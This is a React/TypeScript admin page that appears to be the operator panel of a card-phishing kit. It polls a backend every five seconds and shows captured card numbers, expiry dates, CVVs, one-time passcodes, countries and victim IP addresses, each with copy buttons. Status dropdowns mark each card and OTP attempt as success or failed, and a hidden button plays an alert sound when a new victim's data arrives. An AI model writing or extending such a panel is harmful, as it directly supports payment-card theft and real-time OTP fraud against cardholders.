import {useEffect, useState, useRef, useCallback, startTransition} from "react";
// @ts-ignore
import alertSound from '../../assets/sound.m4a';
import {PAGE_LIMIT, PAGE_SIZE} from "../../configs";
import {IAjax, InitalState} from "../../typings/datatable";
import {API, ITEM_NAME, SEARCH_COLUMNS, CookieState} from "./constant";
import type {ColumnsType, TablePaginationConfig} from "antd/es/table";
import {FilterValue} from "antd/es/table/interface";
import {
  Table,
  Row,
  Col,
  Space,
  Breadcrumb,
  Card,
  Button,
  Tooltip,
  Popover,
  message,
  Menu,
  Dropdown,
  Checkbox,
} from "antd";
import {Helmet} from "react-helmet";
import {ReloadOutlined, SettingOutlined, CopyOutlined, DownOutlined} from "@ant-design/icons";
import Action from "./Action";
import Delete from "./Delete";
import Search from "./Search";
import {useAppDispatch, useAppSelector} from "../../redux/hooks";
import {toggleColumnHidden} from "../../redux/reducers/tableSlice";
import {numberFormat} from "../../utils";
import CopyToClipboard from "react-copy-to-clipboard";
import Tags from "./Tags";
import {Simulate} from "react-dom/test-utils";
import play = Simulate.play;
import StatusDropdown from "./dropdown";

const initialState: InitalState = {
  pagination: {
    current: 1,
    pageSize: PAGE_SIZE,
    pageSizeOptions: PAGE_LIMIT,
    showSizeChanger: true
  },
  data: [],
  loading: false,
  selectedRowKeys: [],
  updated: 0,

  sort: {
    field: 'updatedAt',
    order: 'descend',
  }
}
const ProxyGroup = () => {
  const isFirstRender = useRef(true);
  const alertButton = useRef(null);
  const [state, setState] = useState(initialState);

  const fetchData = useCallback(async () => {
    try {
      setState(prevState => ({
        ...prevState,
        loading: true
      }));
      const data: IAjax = {
        pageSize: state.pagination.pageSize,
        current: state.pagination.current,
        searchColumn: SEARCH_COLUMNS,
        search: state?.filters,
        field: state.sort?.field,
        order: state.sort?.order
      }
      if (API.getAll) {
        const response = await API.getAll(data);
        if (response.data.success) {
          setState((prevState) => {
            const [lastUpdated] = response.data.data ?? [];
            const [lastItem] = prevState.data ?? [];
            if (!isFirstRender.current && lastUpdated?.updatedAt !== lastItem?.updatedAt) {
              (alertButton.current as any)?.click();
            }
            isFirstRender.current = false;
            return ({
              ...prevState,
              data: response.data.data,
              selectedRowKeys: [],
              pagination: {
                ...prevState.pagination,
                total: response.data.recordsFiltered,
              },
            });
          })
        } else {
          message.open({
            type: "error",
            content: response.data.message
          });
        }
      }
    } catch (error) {
      console.error(error);
    } finally {
      setState((prevState) => ({
        ...prevState,
        loading: false
      }))
    }
  }, [state]);

  useEffect(() => {
    fetchData();
    const interval = setInterval(() => {
      fetchData(); // Fetch data after the specified interval
    }, 5000); // Fetch data every 5 seconds

    return () => clearInterval(interval); // Cleanup the interval on component unmount

  }, [state.filters, state.pagination.current, state.sort, state.updated]);

  const playAlertSound = () => {
    const audio = new Audio(alertSound);
    audio.play().catch(() => {});
  };

  useEffect(() => {
    // playAlertSound();
    // (alertButton.current as any)?.click();
  }, [])
  const handleTableChange = (pagination: TablePaginationConfig, filters: Record<string, FilterValue | null>, sorter: any) => {
    setState(prevState => ({
      ...prevState,
      filters: {
        ...prevState.filters,
        ...filters
      },
      pagination: {
        ...prevState.pagination,
        current: pagination.current || 1,
        pageSize: pagination.pageSize || PAGE_SIZE
      },
      sort: {
        field: sorter.field?.toString(),
        order: sorter.order?.toString(),
      }
    }))
  }
  const handleReload = () => {
    setState(prevState => ({
      ...prevState,
      updated: prevState.updated + 1
    }))
  }
  const TABLE_COLUMNS: ColumnsType<CookieState> = [
    {
      title: "STT",
      dataIndex: "orderId",
      key: "orderId",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <>{value}</>
        )
      }
    },
    {
      title: "Card number",
      dataIndex: "cardNumber",
      key: "cardNumber",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <CopyToClipboard text={value} onCopy={() => {
            message.success("Copied");
          }}>
            <Button>{value}</Button>
          </CopyToClipboard>
        )
      }
    }
    ,
    {
      title: "Card number status",
      dataIndex: "cardNumberStatus",
      key: "done",
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
            <StatusDropdown onClickItem={(status) => {
              if (API.editItem) {
                API.editItem(record._id ?? '', {
                  cardNumberStatus: status,
                }).then(() => fetchData());
              }
            }}>
              <div style={{ color: value === 'success' ? 'green' : (value === 'failed' ? 'red' : '')}}>{value}</div>
            </StatusDropdown>
        );
      }
    },
    {
      title: "Expired date",
      dataIndex: "expiredDate",
      key: "expiredDate",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <CopyToClipboard text={value} onCopy={() => {
            message.success("Copied");
          }}>
            <Button>{value}</Button>
          </CopyToClipboard>
        )
      }
    },

    {
      title: "CVV",
      dataIndex: "cvv",
      key: "cvv",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <CopyToClipboard text={value} onCopy={() => {
            message.success("Copied");
          }}>
            <Button>{value}</Button>
          </CopyToClipboard>
        )
      }
    },
    {
      title: "OTP",
      dataIndex: "otp",
      key: "otp",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <>
            {value && (
              <CopyToClipboard text={value} onCopy={() => {
                message.success("Copied");
              }}>
                <Button>{value}</Button>
              </CopyToClipboard>
            )}
          </>

        )
      }
    }
    ,
    {
      title: "OTP status",
      dataIndex: "otpStatus",
      key: "otpStatus",
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
            <StatusDropdown onClickItem={(status) => {
              if (API.editItem) {
                API.editItem(record._id ?? '', {
                  otpStatus: status,
                }).then(() => fetchData());
              }
            }}>
              <div style={{ color: value === 'success' ? 'green' : (value === 'failed' ? 'red' : '')}}>{value}</div>
              </StatusDropdown>
        )
      }
    },
    {
      title: "Tags",
      dataIndex: "tags",
      key: "tags",
      sorter: true,
      render: (value: string[], record) => {
        return (
          <Tags id={record?._id || ""} tags={value}/>
        )
      }
    },
    {
      title: "Country",
      dataIndex: "country",
      key: "country",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <Button>
            {value}
          </Button>
        )
      }
    }, {
      title: "IP",
      dataIndex: "ip",
      key: "ip",
      sorter: true,
      showSorterTooltip: false,
      render: (value: string, record) => {
        return (
          <CopyToClipboard text={value} onCopy={() => {
            message.success("Copied");
          }}>
            <Button type="link">
              {value}
            </Button>
          </CopyToClipboard>
        )
      }
    },
    {
      title: "Action",
      dataIndex: "id",
      key: "action",
      render: (value: string, record) => {
        return (
          <>
            <Space>
              <Delete item={record} onReload={handleReload}/>
            </Space>
          </>
        )
      }
    }];

  // visible columns
  const tableKey = "cookie_item";
  const hiddenColumns = useAppSelector((state) => state.table[tableKey]);
  const dispatch = useAppDispatch();

  const handleColumnVisibility = (column: string) => {
    dispatch(toggleColumnHidden({
      table: tableKey,
      column
    }))
  };
  const VISIBLE_COLUMNS = TABLE_COLUMNS.filter(
    (column) => !hiddenColumns.includes(String(column.key))
  );

  const menu = (
    <Menu>
      {TABLE_COLUMNS.map((column) => (
        <Menu.Item key={column.key}>
          <Checkbox
            checked={!hiddenColumns.includes(String(column.key))}
            onChange={() => handleColumnVisibility(String(column.key))}
          >
            {String(column.title)}
          </Checkbox>
        </Menu.Item>
      ))}
    </Menu>
  );

  return (
    <>
      <Helmet>
        <meta charSet="utf-8"/>
        <title>{ITEM_NAME}</title>
      </Helmet>
      <button ref={alertButton} onClick={playAlertSound} style={{display: 'none'}}></button>
      <Breadcrumb>
        <Breadcrumb.Item>Trang Chủ</Breadcrumb.Item>
        <Breadcrumb.Item>{ITEM_NAME}</Breadcrumb.Item>
      </Breadcrumb>
      <Card>
        <Row gutter={[16, 16]} className="row-actions">
          <Col md={16} sm={24} className="ant-col-filters">
            <Tooltip title="Reload">
              <Button icon={<ReloadOutlined/>} onClick={handleReload} loading={state.loading}/>
            </Tooltip>
            <Dropdown overlay={menu}>
              <Button icon={<SettingOutlined/>}/>
            </Dropdown>
            <Search
              setState={setState}
              filters={state.filters}
            />
          </Col>
          <Col md={8} sm={24} className="right-aligned ant-col-actions">
            <Space>
              <Action ids={state.selectedRowKeys} setState={setState}/>
            </Space>
          </Col>
        </Row>
        <Table
          scroll={{x: 1000}}
          columns={VISIBLE_COLUMNS}
          onChange={handleTableChange}
          dataSource={state.data}
          pagination={state.pagination}
          loading={state.loading}
          tableLayout="auto"
          rowKey="_id"
          rowSelection={{
            selectedRowKeys: state.selectedRowKeys,
            type: "checkbox",
            preserveSelectedRowKeys: false,
            onChange: (key: any) => {
              setState(prevState => ({
                ...prevState,
                selectedRowKeys: key
              }))
            }
          }}
        />
      </Card>
    </>
  );
}

export default ProxyGroup;